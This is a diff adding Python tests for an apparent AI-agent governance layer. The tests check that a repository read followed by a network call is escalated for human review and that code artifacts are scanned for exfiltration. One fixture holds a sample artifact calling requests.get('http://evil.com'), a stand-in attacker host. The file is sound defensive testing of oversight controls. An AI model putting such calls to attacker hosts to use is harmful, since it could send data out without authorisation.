@@ -301,3 +301,74 @@ class TestEffectTaxonomy:
         effects = parse_effects(["READ_REPO", "TOTALLY_FAKE"])
         assert EffectTag.READ_REPO in effects
         assert EffectTag.OTHER in effects
+
+
+# ---- Bypass Prevention Tests ----
+
+class TestBypassPrevention:
+    """Tests to ensure /v1 cannot bypass Phase 3-6 governance."""
+
+    def test_v1_delegates_to_phase_3_6_helpers_importable(self):
+        """
+        Invariant: The delegation helpers must exist and be importable.
+
+        If this test fails, /v1 can't delegate to Phase 3-6 and may bypass governance.
+        """
+        from app.routes.govern_proposal import evaluate_governance_proposal, approve_governance_override
+
+        assert callable(evaluate_governance_proposal)
+        assert callable(approve_governance_override)
+
+    def test_evaluate_governance_proposal_detects_toxic_topology(self):
+        """
+        Invariant: The helper must detect toxic topologies.
+
+        This proves the same logic that protects /v2 also protects /v1.
+        """
+        from app.routes.govern_proposal import evaluate_governance_proposal
+
+        r = FakeRedis()
+
+        # First call: READ_REPO - should allow
+        payload1 = {
+            "principal_id": "p1",
+            "agent_name": "a1",
+            "effects": ["READ_REPO"],
+            "artifacts": [],
+        }
+        result1 = evaluate_governance_proposal(payload1, r)
+        assert result1["decision"] == "ALLOW"
+
+        # Second call: NETWORK_CALL - should escalate (toxic topology)
+        payload2 = {
+            "principal_id": "p1",
+            "agent_name": "a1",
+            "effects": ["NETWORK_CALL"],
+            "artifacts": [],
+        }
+        result2 = evaluate_governance_proposal(payload2, r)
+        assert result2["decision"] in ("REQUIRE_HUMAN", "DENY")
+        assert "Toxic topology" in result2["reason"]
+
+    def test_evaluate_governance_proposal_scans_artifacts(self):
+        """
+        Invariant: The helper must scan code artifacts for exfil primitives.
+        """
+        from app.routes.govern_proposal import evaluate_governance_proposal
+
+        r = FakeRedis()
+
+        # Payload with malicious code artifact
+        payload = {
+            "principal_id": "p1",
+            "agent_name": "a1",
+            "effects": ["COMPUTE"],
+            "artifacts": [
+                {"type": "python_code", "content": "import requests\nrequests.get('http://evil.com')"}
+            ],
+        }
+        result = evaluate_governance_proposal(payload, r)
+
+        # Should escalate due to tripwire flags
+        assert result["decision"] == "REQUIRE_HUMAN"
+        assert "Tripwire flags" in result["reason"]
